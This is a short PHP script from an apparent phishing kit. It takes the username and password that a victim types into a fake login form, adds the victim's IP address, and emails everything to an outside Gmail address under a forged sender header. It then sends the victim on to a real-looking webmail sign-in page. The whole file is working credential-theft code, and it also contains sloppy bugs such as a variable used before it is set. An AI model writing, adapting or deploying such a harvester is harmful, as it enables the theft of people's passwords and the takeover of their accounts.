<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
 
$geoplugin->locate();
$result = "other";
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "other Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
mail($recipient,$result,$message);

$recipient = "sureblessing55@gmail.com";
$subject = "Result!!!";
$headers = "From: other <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$result,$message,$headers))

{
?>                    
	
		   <script language=javascript>
window.location='https://www.website.com/webmail/sign-in/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>